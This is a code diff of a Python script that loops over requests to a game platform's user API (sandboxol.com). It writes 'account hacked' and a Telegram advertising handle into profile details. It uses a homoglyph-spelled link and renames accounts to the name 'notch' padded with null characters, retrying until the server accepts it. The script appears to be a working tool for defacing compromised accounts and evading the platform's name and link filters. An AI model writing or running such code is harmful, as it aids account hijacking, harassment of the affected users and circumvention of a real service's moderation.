@@ -26,7 +26,7 @@ while True:
             "http://staticgs.sandboxol.com/sandbox/avatar/1735766509212498.jpg"
         ]),
         "birthday": "0688-01-01",
-        "details": "account hacked\ntelegram @nullowns\nt.mе/nullowns"
+        "details": "account hacked\ntelegram @nullowns\nhttрs://t.mе/nullowns"
     }
 
     try:
@@ -36,8 +36,15 @@ while True:
         continue
 
     if response["message"] == "SUCCESS":
+        text = "notch"
         try:
-            response = requests.put(f"https://gw.sandboxol.com/user/api/v3/user/nickName?newName={''.join(random.choices('0123456789', k=20))}&oldName={response['data']['nickName']}", headers=headers).json()
+            while True:
+                name = "".join("\u0000" * random.randint(0, 3) + char + "\u0000" * random.randint(0, 3) for char in text)[:22]
+                response = requests.put(f"https://gw.sandboxol.com/user/api/v3/user/nickName?newName={name}&oldName={response['data']['nickName']}", headers=headers).json()
+                if response["message"] not in ["SUCCESS"]:
+                    continue
+                else:
+                    break
         except:
             send -= 1
             continue
